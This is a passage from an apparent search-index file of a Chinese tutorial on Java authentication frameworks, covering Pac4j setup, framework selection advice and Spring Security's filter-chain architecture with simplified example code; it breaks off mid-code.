\u591a\u79df\u6237\u652f\u6301 - \u2705 \u6d3b\u8dc3\u7684\u793e\u533a - \u2705 \u9002\u5408\u5fae\u670d\u52a1\u67b6\u6784</p> <p>\u7f3a\u70b9\uff1a - \u274c \u76f8\u5bf9\u91cd\u91cf\u7ea7 - \u274c \u9700\u8981\u72ec\u7acb\u90e8\u7f72 - \u274c \u5b66\u4e60\u66f2\u7ebf\u8f83\u9661 - \u274c \u8d44\u6e90\u5360\u7528\u8f83\u591a - \u274c \u5b9a\u5236\u5316\u53ef\u80fd\u590d\u6742</p>"},{"location":"auth/03-Java%E8%AE%A4%E8%AF%81%E6%A1%86%E6%9E%B6%E5%AF%B9%E6%AF%94/#_26","title":"\u9002\u7528\u573a\u666f","text":"<ul> <li>\u4f01\u4e1aSSO\u89e3\u51b3\u65b9\u6848</li> <li>\u5fae\u670d\u52a1\u67b6\u6784</li> <li>\u591a\u5e94\u7528\u7edf\u4e00\u8ba4\u8bc1</li> <li>\u9700\u8981\u7528\u6237\u7ba1\u7406\u754c\u9762</li> <li>OAuth2/OIDC\u6807\u51c6\u5316\u5b9e\u73b0</li> <li>\u591a\u79df\u6237SaaS\u5e94\u7528</li> </ul>"},{"location":"auth/03-Java%E8%AE%A4%E8%AF%81%E6%A1%86%E6%9E%B6%E5%AF%B9%E6%AF%94/#pac4j","title":"Pac4j","text":""},{"location":"auth/03-Java%E8%AE%A4%E8%AF%81%E6%A1%86%E6%9E%B6%E5%AF%B9%E6%AF%94/#_27","title":"\u6982\u8ff0","text":"<p>Pac4j \u662f\u4e00\u4e2a\u901a\u7528\u7684Java\u5b89\u5168\u6846\u67b6\uff0c\u652f\u6301\u591a\u79cd\u8ba4\u8bc1\u534f\u8bae\uff0c\u53ef\u4ee5\u96c6\u6210\u5230\u5404\u79cdJava Web\u6846\u67b6\u4e2d\u3002</p> <p>\u5b98\u7f51\uff1a https://www.pac4j.org/</p>"},{"location":"auth/03-Java%E8%AE%A4%E8%AF%81%E6%A1%86%E6%9E%B6%E5%AF%B9%E6%AF%94/#_28","title":"\u6838\u5fc3\u7279\u6027","text":"<ol> <li>\u591a\u534f\u8bae\u652f\u6301</li> <li>OAuth 2.0</li> <li>OIDC</li> <li>SAML</li> <li>CAS</li> <li>HTTP (Basic, Digest, Form)</li> <li>JWT</li> <li>LDAP</li> <li> <p>Database</p> </li> <li> <p>\u591a\u6846\u67b6\u96c6\u6210</p> </li> <li>Spring Boot/Spring MVC</li> <li>Jakarta EE</li> <li>Play Framework</li> <li>Vert.x</li> <li>Spark Java</li> <li>Ratpack</li> </ol>"},{"location":"auth/03-Java%E8%AE%A4%E8%AF%81%E6%A1%86%E6%9E%B6%E5%AF%B9%E6%AF%94/#_29","title":"\u5feb\u901f\u5f00\u59cb","text":"<pre><code>&lt;dependency&gt;\n    &lt;groupId&gt;org.pac4j&lt;/groupId&gt;\n    &lt;artifactId&gt;spring-webmvc-pac4j&lt;/artifactId&gt;\n    &lt;version&gt;6.0.0&lt;/version&gt;\n&lt;/dependency&gt;\n&lt;dependency&gt;\n    &lt;groupId&gt;org.pac4j&lt;/groupId&gt;\n    &lt;artifactId&gt;pac4j-oauth&lt;/artifactId&gt;\n    &lt;version&gt;5.7.0&lt;/version&gt;\n&lt;/dependency&gt;\n&lt;dependency&gt;\n    &lt;groupId&gt;org.pac4j&lt;/groupId&gt;\n    &lt;artifactId&gt;pac4j-oidc&lt;/artifactId&gt;\n    &lt;version&gt;5.7.0&lt;/version&gt;\n&lt;/dependency&gt;\n</code></pre> <pre><code>/**\n * Pac4j\u914d\u7f6e\n */\n@Configuration\npublic class Pac4jConfig {\n\n    @Bean\n    public Config config() {\n        // OAuth\u914d\u7f6e\n        final GitHubClient gitHubClient = new GitHubClient(\"clientId\", \"clientSecret\");\n        final GoogleOidcClient googleOidcClient = new GoogleOidcClient(\"clientId\", \"clientSecret\");\n\n        // \u8868\u5355\u8ba4\u8bc1\n        final FormClient formClient = new FormClient(\"/login\", \n            new SimpleTestUsernamePasswordAuthenticator());\n\n        // JWT\u8ba4\u8bc1\n        final JwtAuthenticator jwtAuthenticator = new JwtAuthenticator();\n        jwtAuthenticator.addSignatureConfiguration(new SecretSignatureConfiguration(\"secret\"));\n        final HeaderClient jwtClient = new HeaderClient(\"Authorization\", \"Bearer \", jwtAuthenticator);\n\n        // \u521b\u5efaClients\n        final Clients clients = new Clients(\"/callback\", \n            gitHubClient, googleOidcClient, formClient, jwtClient);\n\n        // \u521b\u5efaConfig\n        final Config config = new Config(clients);\n        config.addAuthorizer(\"admin\", new RequireAnyRoleAuthorizer&lt;&gt;(\"ADMIN\"));\n        config.addAuthorizer(\"custom\", new CustomAuthorizer());\n\n        return config;\n    }\n\n    @Bean\n    public SecurityInterceptor securityInterceptor(Config config) {\n        return new SecurityInterceptor(config, \"FormClient\");\n    }\n}\n\n/**\n * \u4f7f\u7528Pac4j\u4fdd\u62a4\u7aef\u70b9\n */\n@RestController\n@RequestMapping(\"/api\")\npublic class ApiController {\n\n    @GetMapping(\"/profile\")\n    public UserProfile getProfile(@RequestAttribute(\"pac4jUserProfile\") UserProfile profile) {\n        return profile;\n    }\n\n    @GetMapping(\"/admin\")\n    @RequireAnyRole(\"ADMIN\")\n    public String adminArea() {\n        return \"Admin area\";\n    }\n}\n</code></pre>"},{"location":"auth/03-Java%E8%AE%A4%E8%AF%81%E6%A1%86%E6%9E%B6%E5%AF%B9%E6%AF%94/#_30","title":"\u4f18\u7f3a\u70b9","text":"<p>\u4f18\u70b9\uff1a - \u2705 \u652f\u6301\u591a\u79cd\u8ba4\u8bc1\u534f\u8bae - \u2705 \u6846\u67b6\u65e0\u5173\uff0c\u6613\u4e8e\u96c6\u6210 - \u2705 \u914d\u7f6e\u7075\u6d3b - \u2705 \u6587\u6863\u6e05\u6670</p> <p>\u7f3a\u70b9\uff1a - \u274c \u793e\u533a\u76f8\u5bf9\u8f83\u5c0f - \u274c \u4e0d\u5982Spring Security\u5168\u9762 - \u274c \u9700\u8981\u624b\u52a8\u914d\u7f6e\u8f83\u591a - \u274c \u751f\u6001\u4e0d\u5982\u4e3b\u6d41\u6846\u67b6\u4e30\u5bcc</p>"},{"location":"auth/03-Java%E8%AE%A4%E8%AF%81%E6%A1%86%E6%9E%B6%E5%AF%B9%E6%AF%94/#_31","title":"\u9002\u7528\u573a\u666f","text":"<ul> <li>\u9700\u8981\u652f\u6301\u591a\u79cd\u8ba4\u8bc1\u534f\u8bae</li> <li>\u975eSpring\u9879\u76ee</li> <li>\u9700\u8981\u6846\u67b6\u65e0\u5173\u7684\u89e3\u51b3\u65b9\u6848</li> <li>\u5feb\u901f\u96c6\u6210\u7b2c\u4e09\u65b9\u767b\u5f55</li> </ul>"},{"location":"auth/03-Java%E8%AE%A4%E8%AF%81%E6%A1%86%E6%9E%B6%E5%AF%B9%E6%AF%94/#_32","title":"\u6846\u67b6\u9009\u578b\u5efa\u8bae","text":""},{"location":"auth/03-Java%E8%AE%A4%E8%AF%81%E6%A1%86%E6%9E%B6%E5%AF%B9%E6%AF%94/#_33","title":"\u51b3\u7b56\u6811","text":"<pre><code>\u9700\u8981\u5b8c\u6574\u7684IAM\u89e3\u51b3\u65b9\u6848\uff1f\n    \u251c\u2500 \u662f \u2192 Keycloak\n    \u2514\u2500 \u5426 \u2193\n\n\u4f7f\u7528Spring\u751f\u6001\uff1f\n    \u251c\u2500 \u662f \u2192 Spring Security\n    \u2514\u2500 \u5426 \u2193\n\n\u9700\u8981\u591a\u534f\u8bae\u652f\u6301\uff1f\n    \u251c\u2500 \u662f \u2192 Pac4j\n    \u2514\u2500 \u5426 \u2193\n\n\u9700\u6c42\u7b80\u5355\u4e14\u8f7b\u91cf\u7ea7\uff1f\n    \u251c\u2500 \u662f \u2192 Apache Shiro\n    \u2514\u2500 \u5426 \u2193\n\nJava SE\u5e94\u7528\uff1f\n    \u251c\u2500 \u662f \u2192 JAAS\n    \u2514\u2500 \u5426 \u2192 Spring Security (\u6700\u5168\u9762)\n</code></pre>"},{"location":"auth/03-Java%E8%AE%A4%E8%AF%81%E6%A1%86%E6%9E%B6%E5%AF%B9%E6%AF%94/#_34","title":"\u573a\u666f\u63a8\u8350","text":"\u573a\u666f \u63a8\u8350\u6846\u67b6 \u7406\u7531 Spring Boot\u5fae\u670d\u52a1 Spring Security \u6df1\u5ea6\u96c6\u6210\uff0c\u5b8c\u6574\u652f\u6301 \u4f01\u4e1aSSO Keycloak \u5f00\u7bb1\u5373\u7528\u7684IAM\u5e73\u53f0 \u7b80\u5355Web\u5e94\u7528 Apache Shiro \u8f7b\u91cf\u7ea7\uff0c\u6613\u4e0a\u624b \u591a\u5e94\u7528SSO Keycloak + Spring Security Keycloak\u63d0\u4f9b\u8ba4\u8bc1\u4e2d\u5fc3 \u975eSpring\u9879\u76ee Pac4j \u6216 Apache Shiro \u6846\u67b6\u65e0\u5173 \u684c\u9762\u5e94\u7528 JAAS Java\u6807\u51c6API OAuth/OIDC\u5ba2\u6237\u7aef Pac4j \u591a\u534f\u8bae\u652f\u6301\u597d \u590d\u6742\u6743\u9650\u9700\u6c42 Spring Security \u5f3a\u5927\u7684\u6388\u6743\u673a\u5236"},{"location":"auth/03-Java%E8%AE%A4%E8%AF%81%E6%A1%86%E6%9E%B6%E5%AF%B9%E6%AF%94/#_35","title":"\u6280\u672f\u6808\u5bf9\u5e94","text":"<pre><code>Spring Boot \u2192 Spring Security (\u9996\u9009)\nJakarta EE \u2192 JAAS (\u6807\u51c6) \u6216 Pac4j (\u73b0\u4ee3)\nPlay Framework \u2192 Pac4j\nVert.x \u2192 Pac4j\n\u4f20\u7edfServlet \u2192 Shiro \u6216 Spring Security\n\u5fae\u670d\u52a1\u67b6\u6784 \u2192 Keycloak + Spring Security\n</code></pre>"},{"location":"auth/03-Java%E8%AE%A4%E8%AF%81%E6%A1%86%E6%9E%B6%E5%AF%B9%E6%AF%94/#_36","title":"\u603b\u7ed3","text":"<p>\u672c\u6587\u5bf9\u6bd4\u4e86Java\u751f\u6001\u4e2d\u4e3b\u6d41\u7684\u8ba4\u8bc1\u6388\u6743\u6846\u67b6\uff1a</p> <ol> <li>Spring Security - \u529f\u80fd\u6700\u5168\u9762\uff0cSpring\u751f\u6001\u9996\u9009</li> <li>Apache Shiro - \u8f7b\u91cf\u7ea7\uff0c\u7b80\u5355\u6613\u7528</li> <li>JAAS - Java\u6807\u51c6API\uff0c\u9002\u5408Java SE</li> <li>Keycloak - \u5b8c\u6574\u7684IAM\u5e73\u53f0\uff0c\u4f01\u4e1aSSO\u9996\u9009</li> <li>Pac4j - \u591a\u534f\u8bae\u652f\u6301\uff0c\u6846\u67b6\u65e0\u5173</li> </ol> <p>\u9009\u62e9\u5efa\u8bae\uff1a - \u65b0\u9879\u76ee\u4f7f\u7528Spring Boot \u2192 Spring Security - \u9700\u8981SSO\u548c\u7528\u6237\u7ba1\u7406 \u2192 Keycloak - \u7b80\u5355\u9879\u76ee\u6216\u975eSpring \u2192 Apache Shiro - \u9700\u8981\u591a\u534f\u8bae\u96c6\u6210 \u2192 Pac4j</p> <p>\u7ee7\u7eed\u5b66\u4e60\uff1a - \u4e0a\u4e00\u7ae0\uff1a\u8ba4\u8bc1\u534f\u8bae\u4e0e\u6807\u51c6 - \u4e0b\u4e00\u7ae0\uff1aSpring Security\u6838\u5fc3\u67b6\u6784</p>"},{"location":"auth/04-SpringSecurity%E6%A0%B8%E5%BF%83%E6%9E%B6%E6%9E%84/","title":"Spring Security\u6838\u5fc3\u67b6\u6784","text":""},{"location":"auth/04-SpringSecurity%E6%A0%B8%E5%BF%83%E6%9E%B6%E6%9E%84/#_1","title":"\u76ee\u5f55","text":"<ul> <li>\u67b6\u6784\u6982\u89c8</li> <li>\u8fc7\u6ee4\u5668\u94fe\u673a\u5236</li> <li>\u8ba4\u8bc1\u67b6\u6784</li> <li>\u6388\u6743\u67b6\u6784</li> <li>\u6838\u5fc3\u7ec4\u4ef6\u8be6\u89e3</li> <li>Security Context</li> <li>\u81ea\u5b9a\u4e49\u6269\u5c55</li> </ul>"},{"location":"auth/04-SpringSecurity%E6%A0%B8%E5%BF%83%E6%9E%B6%E6%9E%84/#_2","title":"\u67b6\u6784\u6982\u89c8","text":""},{"location":"auth/04-SpringSecurity%E6%A0%B8%E5%BF%83%E6%9E%B6%E6%9E%84/#spring-security_1","title":"Spring Security\u67b6\u6784\u56fe","text":"<pre><code>HTTP Request\n    \u2502\n    \u25bc\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502         DelegatingFilterProxy (Servlet Filter)       \u2502\n\u2502              (\u7531Spring\u5bb9\u5668\u7ba1\u7406)                       \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                  \u2502\n                  \u25bc\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502           FilterChainProxy (springSecurityFilterChain)\u2502\n\u2502                Bean name: \"springSecurityFilterChain\" \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                  \u2502\n                  \u25bc\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502              SecurityFilterChain                     \u2502\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510  \u2502\n\u2502  \u2502  1. SecurityContextPersistenceFilter          \u2502  \u2502\n\u2502  \u2502  2. CsrfFilter                                \u2502  \u2502\n\u2502  \u2502  3. LogoutFilter                              \u2502  \u2502\n\u2502  \u2502  4. UsernamePasswordAuthenticationFilter      \u2502  \u2502\n\u2502  \u2502  5. BasicAuthenticationFilter                 \u2502  \u2502\n\u2502  \u2502  6. RequestCacheAwareFilter                   \u2502  \u2502\n\u2502  \u2502  7. SecurityContextHolderAwareRequestFilter   \u2502  \u2502\n\u2502  \u2502  8. AnonymousAuthenticationFilter             \u2502  \u2502\n\u2502  \u2502  9. SessionManagementFilter                   \u2502  \u2502\n\u2502  \u2502 10. ExceptionTranslationFilter                \u2502  \u2502\n\u2502  \u2502 11. FilterSecurityInterceptor (\u6388\u6743)          \u2502  \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518  \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                  \u2502\n                  \u25bc\n            Application Code\n</code></pre>"},{"location":"auth/04-SpringSecurity%E6%A0%B8%E5%BF%83%E6%9E%B6%E6%9E%84/#_3","title":"\u6838\u5fc3\u6a21\u5757","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502          Spring Security Core                     \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502  Authentication (\u8ba4\u8bc1)                            \u2502\n\u2502  \u2022 AuthenticationManager                         \u2502\n\u2502  \u2022 AuthenticationProvider                        \u2502\n\u2502  \u2022 UserDetailsService                            \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502  Authorization (\u6388\u6743)                             \u2502\n\u2502  \u2022 AccessDecisionManager                         \u2502\n\u2502  \u2022 AccessDecisionVoter                           \u2502\n\u2502  \u2022 SecurityMetadataSource                        \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502  Security Context (\u5b89\u5168\u4e0a\u4e0b\u6587)                    \u2502\n\u2502  \u2022 SecurityContext                               \u2502\n\u2502  \u2022 SecurityContextHolder                         \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502  Configuration (\u914d\u7f6e)                             \u2502\n\u2502  \u2022 SecurityFilterChain                           \u2502\n\u2502  \u2022 HttpSecurity                                  \u2502\n\u2502  \u2022 WebSecurity                                   \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"auth/04-SpringSecurity%E6%A0%B8%E5%BF%83%E6%9E%B6%E6%9E%84/#_4","title":"\u8fc7\u6ee4\u5668\u94fe\u673a\u5236","text":""},{"location":"auth/04-SpringSecurity%E6%A0%B8%E5%BF%83%E6%9E%B6%E6%9E%84/#_5","title":"\u8fc7\u6ee4\u5668\u94fe\u5de5\u4f5c\u539f\u7406","text":"<p>Spring Security\u7684\u6838\u5fc3\u662f\u4e00\u7cfb\u5217\u8fc7\u6ee4\u5668\uff08Filter\uff09\uff0c\u6309\u7167\u7279\u5b9a\u987a\u5e8f\u7ec4\u6210\u8fc7\u6ee4\u5668\u94fe\u3002</p> <p>\u8fc7\u6ee4\u5668\u6267\u884c\u987a\u5e8f\uff1a</p> <pre><code>/**\n * Spring Security\u9ed8\u8ba4\u8fc7\u6ee4\u5668\u94fe\u987a\u5e8f\n */\npublic enum FilterOrderEnum {\n\n    FIRST(-100),\n\n    CHANNEL_FILTER(100),  // \u5f3a\u5236HTTPS\n\n    SECURITY_CONTEXT_FILTER(200),  // SecurityContextPersistenceFilter\n\n    CONCURRENT_SESSION_FILTER(300),\n\n    HEADERS_FILTER(400),  // \u6dfb\u52a0\u5b89\u5168\u54cd\u5e94\u5934\n\n    CSRF_FILTER(500),  // CSRF\u9632\u62a4\n\n    LOGOUT_FILTER(600),  // \u767b\u51fa\u5904\u7406\n\n    X509_FILTER(700),\n\n    PRE_AUTH_FILTER(800),\n\n    CAS_FILTER(900),\n\n    FORM_LOGIN_FILTER(1000),  // UsernamePasswordAuthenticationFilter\n\n    OPENID_FILTER(1100),\n\n    LOGIN_PAGE_FILTER(1200),\n\n    DIGEST_AUTH_FILTER(1300),\n\n    BEARER_TOKEN_AUTH_FILTER(1400),  // OAuth2/JWT\n\n    BASIC_AUTH_FILTER(1500),  // BasicAuthenticationFilter\n\n    REQUEST_CACHE_FILTER(1600),\n\n    SERVLET_API_FILTER(1700),\n\n    JAAS_API_FILTER(1800),\n\n    REMEMBER_ME_FILTER(1900),\n\n    ANONYMOUS_FILTER(2000),  // \u533f\u540d\u8ba4\u8bc1\n\n    SESSION_MANAGEMENT_FILTER(2100),\n\n    EXCEPTION_TRANSLATION_FILTER(2200),  // \u5f02\u5e38\u5904\u7406\n\n    FILTER_SECURITY_INTERCEPTOR(2300),  // \u6388\u6743\u51b3\u7b56\n\n    SWITCH_USER_FILTER(2400),\n\n    LAST(Integer.MAX_VALUE);\n\n    private final int order;\n}\n</code></pre>"},{"location":"auth/04-SpringSecurity%E6%A0%B8%E5%BF%83%E6%9E%B6%E6%9E%84/#_6","title":"\u5173\u952e\u8fc7\u6ee4\u5668\u8be6\u89e3","text":""},{"location":"auth/04-SpringSecurity%E6%A0%B8%E5%BF%83%E6%9E%B6%E6%9E%84/#1-securitycontextpersistencefilter","title":"1. SecurityContextPersistenceFilter","text":"<p>\u4f5c\u7528\uff1a \u5728\u8bf7\u6c42\u5f00\u59cb\u65f6\u52a0\u8f7dSecurityContext\uff0c\u8bf7\u6c42\u7ed3\u675f\u65f6\u4fdd\u5b58SecurityContext\u3002</p> <pre><code>/**\n * SecurityContextPersistenceFilter\u7b80\u5316\u5b9e\u73b0\n */\npublic class SecurityContextPersistenceFilter extends GenericFilterBean {\n\n    private SecurityContextRepository repo = new HttpSessionSecurityContextRepository();\n\n    @Override\n    public void doFilter(ServletRequest request, ServletResponse response, \n                        FilterChain chain) throws IOException, ServletException {\n\n        HttpServletRequest httpRequest = (HttpServletRequest) request;\n        HttpServletResponse httpResponse = (HttpServletResponse) response;\n\n        // 1. \u4eceSession\u52a0\u8f7dSecurityContext\n        SecurityContext contextBeforeChain = repo.loadContext(\n            new HttpRequestResponseHolder(httpRequest, httpResponse)\n        );\n\n        try {\n            // 2. \u8bbe\u7f6e\u5230SecurityContextHolder\n            SecurityContextHolder.setContext(contextBeforeChain);\n\n            // 3. \u7ee7\u7eed\u8fc7\u6ee4\u5668\u94fe\n            chain.doFilter(httpRequest, httpResponse);\n\n        } finally {\n            // 4. \u8bf7\u6c42\u7ed3\u675f\u540e\uff0c\u4fdd\u5b58SecurityContext\u5230Session\n            SecurityContext contextAfterChain = SecurityContextHolder.getContext();\n            SecurityContextHolder.clearContext();\n            repo.saveContext(contextAfterChain, httpRequest, httpResponse);\n        }\n    }\n}\n</code></pre>"},{"location":"auth/04-SpringSecurity%E6%A0%B8%E5%BF%83%E6%9E%B6%E6%9E%84/#2-usernamepasswordauthenticationfilter","title":"2. UsernamePasswordAuthenticationFilter","text":"<p>\u4f5c\u7528\uff1a \u5904\u7406\u8868\u5355\u767b\u5f55\u8bf7\u6c42\u3002</p> <pre><code>/**\n * UsernamePasswordAuthenticationFilter\u6838\u5fc3\u903b\u8f91\n */\npublic class UsernamePasswordAuthenticationFilter extends AbstractAuthenticationProcessingFilter {\n\n    public static final String SPRING_SECURITY_FORM_USERNAME_KEY = \"username\";\n    public static final String SPRING_SECURITY_FORM_PASSWORD_KEY = \"password\";\n\n    public UsernamePasswordAuthenticationFilter() {\n        super(new AntPathRequestMatcher(\"/login\", \"POST\"));\n    }\n\n    @Override\n    public Authentication attemptAuthentication(HttpServletRequest request,\n                                               HttpServletResponse response) \n            throws AuthenticationException {\n\n        // 1. \u4ece\u8bf7\u6c42\u4e2d\u63d0\u53d6\u7528\u6237\u540d\u548c\u5bc6\u7801\n        String username = obtainUsername(request);\n        String password = obtainPassword(request);\n\n        // 2. \u521b\u5efa\u672a\u8ba4\u8bc1\u7684Authentication\u5bf9\u8c61\n        UsernamePasswordAuthenticationToken authRequest = \n            new UsernamePasswordAuthenticationToken(username, password);\n\n        // 3. \u8bbe\u7f6e\u8be6\u60c5\uff08IP\u5730\u5740\u7b49\uff09\n        setDetails(request, authRequest);\n\n        // 4. \u59d4\u6258\u7ed9AuthenticationManager\u8fdb\u884c\u8ba4\u8bc1\n        return this.getAuthenticationManager().authenticate(authRequest);\n    }\n\n    protected String obtainUsername(HttpServletRequest request) {\n        return request.getParameter(SPRING_SECURITY_FORM_USERNAME_KEY);\n    }\n\n    protected String obtainPassword(HttpServletRequest request) {\n        return request.getParameter(SPRING_SECURITY_FORM_PASSWORD_KEY);\n    }\n}\n</code></pre>"},{"location":"auth/04-SpringSecurity%E6%A0%B8%E5%BF%83%E6%9E%B6%E6%9E%84/#3-basicauthenticationfilter","title":"3. BasicAuthenticationFilter","text":"<p>\u4f5c\u7528\uff1a \u5904\u7406HTTP Basic\u8ba4\u8bc1\u3002</p> <pre><code>/**\n * BasicAuthenticationFilter\u6838\u5fc3\u903b\u8f91\n */\npublic class BasicAuthenticationFilter extends OncePerRequestFilter {\n\n    private AuthenticationManager authenticationManager;\n\n    @Override\n    protected void doFilterInternal(HttpServletRequest request,\n                                   HttpServletResponse response,\n                                   FilterChain chain) \n            throws IOException, ServletException {\n\n        // 1. \u68c0\u67e5Authorization\u5934\n        String header = request.getHeader(\"Authorization\");\n\n        if (header == null || !header.toLowerCase().startsWith(\"basic \")) {\n            chain.doFilter(request, response);\n            return;\n        }\n\n        try {\n            // 2. \u89e3\u6790Base64\u7f16\u7801\u7684\u51ed\u8bc1\n            String[] tokens = extractAndDecodeHeader(header);\n            String username = tokens[0];\n            String password = tokens[1];\n\n            // 3. \u521b\u5efa\u8ba4\u8bc1\u4ee4\u724c\n            UsernamePasswordAuthenticationToken authRequest = \n                new UsernamePasswordAuthenticationToken(username, password);\n\n            // 4. \u8ba4\u8bc1\n            Authentication authResult = authenticationManager.authenticate(authRequest);\n\n            // 5. \u8bbe\u7f6e\u5230SecurityContext\n            SecurityContextHolder.getContext().setAuthentication(authResult);\n\n            chain.doFilter(request, response);\n\n        } catch (AuthenticationException e) {\n            SecurityContextHolder.clearContext();\n            // \u8fd4\u56de401\u54cd\u5e94\n            response.setHeader(\"WWW-Authenticate\", \"Basic realm=\\\"Realm\\\"\");\n            response.sendError(HttpServletResponse.SC_UNAUTHORIZED);\n        }\n    }\n\n    private String[] extractAndDecodeHeader(String header) throws IOException {\n        byte[] base64Token = header.substring(6).getBytes(StandardCharsets.UTF_8);\n        byte[] decoded = Base64.getDecoder().decode(base64Token);\n        String token = new String(decoded, StandardCharsets.UTF_8);\n\n        int delim = token.indexOf(\":\");\n        if (delim == -1) {\n            throw new BadCredentialsException(\"Invalid basic authentication token\");\n        }\n\n        return new String[] { token.substring(0, delim), token.substring(delim + 1) };\n    }\n}\n</code></pre>"},{"location":"auth/04-SpringSecurity%E6%A0%B8%E5%BF%83%E6%9E%B6%E6%9E%84/#4-exceptiontranslationfilter","title":"4. ExceptionTranslationFilter","text":"<p>\u4f5c\u7528\uff1a \u5904\u7406\u8ba4\u8bc1\u548c\u6388\u6743\u5f02\u5e38\u3002</p> <pre><code>/**\n * ExceptionTranslationFilter\u6838\u5fc3\u903b\u8f91\n */\npublic class ExceptionTranslationFilter extends GenericFilterBean {\n\n    private AuthenticationEntryPoint authenticationEntryPoint;\n    private AccessDeniedHandler 